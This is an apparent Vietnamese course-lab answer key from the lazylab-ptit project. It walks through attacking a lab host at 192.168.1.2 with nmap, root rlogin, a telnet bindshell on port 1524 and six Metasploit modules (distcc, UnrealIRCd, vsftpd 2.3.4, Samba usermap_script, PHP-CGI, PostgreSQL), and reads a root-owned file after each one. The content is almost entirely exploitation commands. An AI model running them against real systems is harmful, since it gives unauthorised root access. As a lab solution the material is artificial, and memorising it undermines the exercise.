# 🛡️ Lab: Sử dụng công cụ metasploit (atk-metasploit)

## Các bước thực hiện & Chuỗi lệnh (Solution)

#### Bước 1: 
Trên terminal **`attacker`** nhập :
```
ping 192.168.1.2
```
(Nhấn Ctrl+C)
```
nmap -p0-65535 192.168.1.2
```

#### Bước 2:
Trên terminal **`attacker`** nhập :
```
rlogin -l root 192.168.1.2
```
```
cat /root/filetoview.txt
```
```
exit
```

#### Bước 3:
Trên terminal **`attacker`** nhập :
```
telnet 192.168.1.2 1524
```
```
cat /root/filetoview.txt
```
```
exit
```

#### Bước 4:
Trên terminal **`attacker`** nhập :
```
sudo msfconsole
```
Chờ chạy xong nhập:
```
search distccd
```

```
use exploit/unix/misc/distcc_exec
```

```
options
```

```
set RHOST 192.168.1.2
```

```
run
```

```
cat /root/filetoview.txt
```
(Nhấn Ctrl+C)

#### Bước 5:
Trên terminal **`attacker`** nhập :
```
sudo msfconsole
```
Chờ chạy xong nhập:
```
search unreal_ircd
```

```
use exploit/unix/irc/unreal_ircd_3281_backdoor
```

```
set RHOST 192.168.1.2
```

```
run
```

```
cat /root/filetoview.txt
```
(Nhấn Ctrl+C)

#### Bước 6:
Trên terminal **`attacker`** nhập :
```
sudo msfconsole
```
Chờ chạy xong nhập:
```
search vsftpd_234
```

```
use exploit/unix/ftp/vsftpd_234_backdoor
```

```
set RHOST 192.168.1.2
```

```
run
```

```
cat /root/filetoview.txt
```
(Nhấn Ctrl+C)

#### Bước 7:
Trên terminal **`attacker`** nhập :
```
sudo msfconsole
```
Chờ chạy xong nhập:
```
search usermap_script
```

```
use exploit/multi/samba/usermap_script
```

```
set RHOST 192.168.1.2
```

```
run
```

```
cat /root/filetoview.txt
```
(Nhấn Ctrl+C)

#### Bước 8:
Trên terminal **`attacker`** nhập :
```
sudo msfconsole
```
Chờ chạy xong nhập:
```
search php_cgi
```

```
use exploit/multi/http/php_cgi_arg_injection
```

```
set RHOST 192.168.1.2
```

```
run
```

```
cat /root/filetoview.txt
```
(Nhấn Ctrl+C)

#### Bước 9:
Trên terminal **`attacker`** nhập :
```
sudo msfconsole
```
Chờ chạy xong nhập:
```
search postgres_payload
```

```
use exploit/linux/postgres/postgres_payload
```

```
set RHOST 192.168.1.2
```

```
run
```

```
cat /root/filetoview.txt
```
(Nhấn Ctrl+C)

## 📌 Bản quyền & Ghi công (Credits)

* **Tác quyền:** Tài liệu và nội dung giải pháp này thuộc dự án **lazylab-ptit** (Biên soạn bởi **Mạc Rô Tích**).
* **Điều khoản chia sẻ:** Cho phép tự do tham khảo và chia sẻ trong cộng đồng sinh viên với mục đích học tập phi thương mại.
* **Quy định trích dẫn:** Mọi hành vi sao chép một phần hoặc toàn bộ tài liệu vui lòng **giữ nguyên nguồn trích dẫn** và liên kết gốc của dự án `lazylab-ptit`. Nghiêm cấm hành vi tự nhận tác quyền hoặc sử dụng vào mục đích thương mại, mua bán tài liệu dưới mọi hình thức.

> *"Lười một cách thông minh, chia sẻ để cùng tiến bộ."*  
> **© lazylab-ptit — Released under the MIT License**
